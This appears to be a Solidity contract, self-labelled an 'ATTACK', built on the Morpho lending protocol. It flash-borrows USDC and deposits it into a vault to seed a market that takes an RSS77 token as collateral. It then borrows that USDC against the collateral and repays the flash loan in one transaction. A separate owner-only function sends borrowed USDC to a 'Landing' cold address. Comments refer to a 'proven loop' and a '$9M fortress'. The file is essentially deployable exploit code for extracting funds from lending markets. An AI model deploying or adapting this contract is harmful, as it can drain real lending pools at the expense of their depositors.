// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20, SafeTransfer, Ownable, ReentrancyGuard} from "./lib/Core.sol";

interface IMorphoAttack {
    struct MarketParams {
        address loanToken;
        address collateralToken;
        address oracle;
        address irm;
        uint256 lltv;
    }

    function supply(MarketParams memory marketParams, uint256 assets, uint256 shares, address onBehalf, bytes memory data)
        external
        returns (uint256, uint256);

    function borrow(
        MarketParams memory marketParams,
        uint256 assets,
        uint256 shares,
        address onBehalf,
        address receiver
    ) external returns (uint256, uint256);

    function flashLoan(address token, uint256 assets, bytes calldata data) external;

    function market(bytes32 id)
        external
        view
        returns (uint128, uint128, uint128, uint128, uint128, uint128);

    function position(bytes32 id, address user) external view returns (uint256, uint128, uint128);
}

interface IMorphoFlashLoanCallback {
    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external;
}

interface IMetaMorphoAttack {
    function deposit(uint256 assets, address receiver) external returns (uint256);
}

/// @notice ATTACK — flash USDC → seed RSS77 liquidity → borrow → repay flash (one tx).
/// @dev Same proven loop as CrownSelfSeedNine / $9M fortress. Collateral must already be posted.
///      End state: Morpho debt + yRSS shares on king. Spendable hot USDC = 0 after flash closes.
///      To land USDC on Landing cold, use borrowToLanding() after liquidity exists (separate tx).
contract CrownFlashAttack500 is Ownable, ReentrancyGuard, IMorphoFlashLoanCallback {
    using SafeTransfer for IERC20;

    IMorphoAttack public immutable morpho;
    IERC20 public immutable usdc;
    IMetaMorphoAttack public immutable yrss;
    address public immutable king;
    bytes32 public immutable marketId;
    IMorphoAttack.MarketParams public mp;

    bool private _locking;

    event Attacked(uint256 borrowUsdc, uint256 yrssShares, uint256 debtAfter);
    event BorrowedToLanding(uint256 usdcOut, address landing);

    error OnlyMorpho();
    error BadAmt();
    error NoLiquidity();
    error NoDebtRoom();

    constructor(
        address morpho_,
        address usdc_,
        address yrss_,
        address king_,
        bytes32 marketId_,
        address rss_,
        address oracle_,
        address irm_,
        uint256 lltv_,
        address owner_
    ) Ownable(owner_) {
        morpho = IMorphoAttack(morpho_);
        usdc = IERC20(usdc_);
        yrss = IMetaMorphoAttack(yrss_);
        king = king_;
        marketId = marketId_;
        mp = IMorphoAttack.MarketParams({
            loanToken: usdc_,
            collateralToken: rss_,
            oracle: oracle_,
            irm: irm_,
            lltv: lltv_
        });
    }

    /// @notice Core ATTACK: flash → yRSS deposit (RSS77 depth) → borrow → flash repaid.
    function attack(uint256 borrowUsdc) external onlyOwner nonReentrant {
        if (borrowUsdc < 100_000e6) revert BadAmt();
        _locking = true;
        morpho.flashLoan(address(usdc), borrowUsdc, abi.encode(borrowUsdc, uint8(0)));
        _locking = false;
    }

    /// @notice Direct Morpho supply seed + borrow to Landing (no yRSS). Needs posted collateral headroom.
    function borrowToLanding(uint256 borrowUsdc, address landing) external onlyOwner nonReentrant {
        if (borrowUsdc == 0 || landing == address(0)) revert BadAmt();
        (uint128 supply,, uint128 borrowed,,,) = morpho.market(marketId);
        uint256 idle = uint256(supply) > uint256(borrowed) ? uint256(supply) - uint256(borrowed) : 0;
        if (idle < borrowUsdc) revert NoLiquidity();
        morpho.borrow(mp, borrowUsdc, 0, king, landing);
        emit BorrowedToLanding(borrowUsdc, landing);
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external override {
        if (msg.sender != address(morpho)) revert OnlyMorpho();
        if (!_locking) revert OnlyMorpho();
        (uint256 borrowUsdc, uint8 mode) = abi.decode(data, (uint256, uint8));
        if (assets != borrowUsdc) revert BadAmt();

        if (mode == 0) {
            // Seed yRSS → RSS77 market (curator queue must be RSS77-first)
            usdc.approve(address(yrss), assets);
            uint256 shares = yrss.deposit(assets, king);

            (uint128 supply,, uint128 borrow,,,) = morpho.market(marketId);
            uint256 idle = uint256(supply) > uint256(borrow) ? uint256(supply) - uint256(borrow) : 0;
            if (idle < assets) revert NoLiquidity();

            morpho.borrow(mp, assets, 0, king, address(this));
            usdc.approve(address(morpho), assets);

            (, uint128 bor,) = morpho.position(marketId, king);
            emit Attacked(assets, shares, uint256(bor));
        }
    }
}
